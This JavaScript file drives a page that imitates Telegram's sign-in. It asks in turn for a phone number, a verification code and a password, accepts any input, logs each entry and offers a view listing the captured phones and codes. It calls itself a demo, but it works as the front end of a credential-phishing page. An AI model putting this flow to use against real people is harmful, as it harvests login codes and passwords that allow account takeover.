// State management
let currentStep = 'step-phone';
let countdown = 60;
let countdownInterval;
let currentPhone = '';
let currentCode = '';
let currentPassword = '';

// DOM elements
const steps = {
    phone: document.getElementById('step-phone'),
    code: document.getElementById('step-code'),
    password: document.getElementById('step-password'),
    success: document.getElementById('step-success'),
    data: document.getElementById('step-data')
};

const progressSteps = {
    phone: document.getElementById('progress-phone'),
    code: document.getElementById('progress-code'),
    password: document.getElementById('progress-password'),
    done: document.getElementById('progress-done')
};

// Initialize event listeners
document.addEventListener('DOMContentLoaded', function() {
    // Button event listeners
    document.getElementById('send-code-btn').addEventListener('click', sendCode);
    document.getElementById('verify-code-btn').addEventListener('click', verifyCode);
    document.getElementById('submit-password-btn').addEventListener('click', submitPassword);
    document.getElementById('resend-btn').addEventListener('click', resendCode);
    document.getElementById('start-over-btn').addEventListener('click', resetDemo);
    document.getElementById('view-data-btn').addEventListener('click', showDataView);
    document.getElementById('back-to-demo-btn').addEventListener('click', backToDemo);
    document.getElementById('clear-data-btn').addEventListener('click', clearAllData);
    
    // Country code update
    document.getElementById('country').addEventListener('change', function() {
        document.getElementById('country-code').value = this.value;
    });

    // Input validation
    document.getElementById('phone').addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
    });

    document.getElementById('code').addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
    });

    console.log('🚀 Telegram Demo Initialized');
    console.log('📊 Current Stats:', demoDB.getStats());
});

function showStep(stepId) {
    // Hide all steps
    Object.values(steps).forEach(step => {
        step.classList.remove('active');
    });
    
    // Show target step
    const stepKey = stepId.replace('step-', '');
    if (steps[stepKey]) {
        steps[stepKey].classList.add('active');
    }
    
    // Update progress
    updateProgress(stepId);
    
    currentStep = stepId;
    console.log('Now showing step:', stepId);
}

function updateProgress(stepId) {
    // Reset all progress steps
    Object.values(progressSteps).forEach(step => {
        step.classList.remove('active', 'completed');
    });

    // Mark previous steps as completed and current as active
    const stepOrder = ['phone', 'code', 'password', 'done'];
    const currentIndex = stepOrder.indexOf(stepId.replace('step-', ''));
    
    stepOrder.forEach((step, index) => {
        if (index < currentIndex) {
            if (progressSteps[step]) {
                progressSteps[step].classList.add('completed');
            }
        } else if (index === currentIndex) {
            if (progressSteps[step]) {
                progressSteps[step].classList.add('active');
            }
        }
    });
}

function showError(elementId, message) {
    const element = document.getElementById(elementId);
    element.textContent = message;
    element.style.display = 'block';
}

function hideError(elementId) {
    document.getElementById(elementId).style.display = 'none';
}

function startCountdown() {
    countdown = 60;
    document.getElementById('resend-btn').disabled = true;
    updateTimer();
    
    countdownInterval = setInterval(() => {
        countdown--;
        updateTimer();
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            document.getElementById('resend-btn').disabled = false;
            document.getElementById('timer').textContent = 'You can now resend the code';
        }
    }, 1000);
}

function updateTimer() {
    document.getElementById('timer').textContent = `Wait ${countdown} seconds to resend`;
}

function sendCode() {
    const countryCode = document.getElementById('country-code').value;
    const phone = document.getElementById('phone').value;
    
    if (!phone || phone.length !== 10) {
        showError('phone-error', 'Please enter a 10-digit phone number');
        return;
    }

    currentPhone = countryCode + phone;

    // Log the attempt
    demoDB.logAttempt(currentPhone, null, null, 'phone_entry', true);
    
    showStep('step-code');
    startCountdown();
    hideError('phone-error');
    
    console.log('📱 Phone registered:', currentPhone);
    console.log('📊 Stats:', demoDB.getStats());
}

function verifyCode() {
    const code = document.getElementById('code').value;
    
    if (!code || code.length !== 6) {
        showError('code-error', 'Please enter a 6-digit verification code');
        return;
    }

    currentCode = code;

    // Log the attempt
    demoDB.logAttempt(currentPhone, currentCode, null, 'code_verification', true);
    
    showStep('step-password');
    hideError('code-error');
    
    console.log('✅ Code verified:', currentCode);
}

function submitPassword() {
    const password = document.getElementById('password').value;
    
    if (!password || password.length < 4) {
        showError('password-error', 'Please enter a password with at least 4 characters');
        return;
    }

    currentPassword = password;

    // Create the complete account
    const account = demoDB.createAccount(currentPhone, currentCode, currentPassword);
    
    // Display the account details on success page
    document.getElementById('success-phone').textContent = currentPhone;
    document.getElementById('success-code').textContent = currentCode;
    document.getElementById('success-password').textContent = '*'.repeat(password.length);
    
    showStep('step-success');
    hideError('password-error');
    
    console.log('🔐 Account completed:', account);
    console.log('📊 Final Stats:', demoDB.getStats());
}

function resendCode() {
    // Log the resend attempt
    demoDB.logAttempt(currentPhone, null, null, 'code_resend', true);
    
    startCountdown();
    hideError('code-error');
    document.getElementById('code').value = '';
    
    console.log('🔄 Code resent for:', currentPhone);
}

function showDataView() {
    const accounts = demoDB.getAllAccounts();
    const attempts = demoDB.getAllAttempts();
    const stats = demoDB.getStats();
    
    let dataHTML = `
        <div class="debug-info">
            <h3>📈 Statistics</h3>
            <p>Total Accounts: <strong>${stats.totalAccounts}</strong></p>
            <p>Total Attempts: <strong>${stats.totalAttempts}</strong></p>
            <p>Successful Logins: <strong>${stats.successfulLogins}</strong></p>
            <p>Failed Logins: <strong>${stats.failedLogins}</strong></p>
        </div>
    `;
    
    if (accounts.length > 0) {
        dataHTML += `
            <h3>✅ Completed Accounts (${accounts.length})</h3>
            <table class="data-table">
                <tr>
                    <th>Phone Number</th>
                    <th>Verification Code</th>
                    <th>Password</th>
                    <th>Created</th>
                    <th>Status</th>
                </tr>
        `;
        
        accounts.forEach(account => {
            const date = new Date(account.created_at).toLocaleString();
            dataHTML += `
                <tr>
                    <td>${account.phone}</td>
                    <td>${account.verification_code}</td>
                    <td>${'*'.repeat(account.password.length)}</td>
                    <td>${date}</td>
                    <td><span class="success-badge">Completed</span></td>
                </tr>
            `;
        });
        
        dataHTML += `</table>`;
    } else {
        dataHTML += `<div class="empty-state">No completed accounts yet.</div>`;
    }
    
    if (attempts.length > 0) {
        dataHTML += `
            <h3>📝 Login Attempts (${attempts.length})</h3>
            <table class="data-table">
                <tr>
                    <th>Type</th>
                    <th>Phone</th>
                    <th>Code</th>
                    <th>Success</th>
                    <th>Timestamp</th>
                </tr>
        `;
        
        // Show only recent 10 attempts
        const recentAttempts = attempts.slice(-10).reverse();
        
        recentAttempts.forEach(attempt => {
            const date = new Date(attempt.timestamp).toLocaleString();
            const successBadge = attempt.success ? '✅ Yes' : '❌ No';
            dataHTML += `
                <tr>
                    <td>${attempt.attempt_type}</td>
                    <td>${attempt.phone || 'N/A'}</td>
                    <td>${attempt.verification_code || 'N/A'}</td>
                    <td>${successBadge}</td>
                    <td>${date}</td>
                </tr>
            `;
        });
        
        dataHTML += `</table>`;
    }
    
    document.getElementById('data-content').innerHTML = dataHTML;
    showStep('step-data');
}

function backToDemo() {
    showStep('step-phone');
}

function clearAllData() {
    if (confirm('Are you sure you want to clear all stored data? This cannot be undone.')) {
        demoDB.clearAllData();
        showDataView(); // Refresh the view
        console.log('🗑️ All data cleared');
    }
}

function resetDemo() {
    // Reset all form fields
    document.getElementById('phone').value = '';
    document.getElementById('code').value = '';
    document.getElementById('password').value = '';
    
    // Reset state
    currentPhone = '';
    currentCode = '';
    currentPassword = '';
    
    // Reset to first step
    showStep('step-phone');
    
    // Clear any errors
    hideError('phone-error');
    hideError('code-error');
    hideError('password-error');
    
    // Reset countdown
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    document.getElementById('resend-btn').disabled = true;
    document.getElementById('timer').textContent = 'Wait 60 seconds to resend';
    
    console.log('🔄 Demo reset - ready for new account');
}
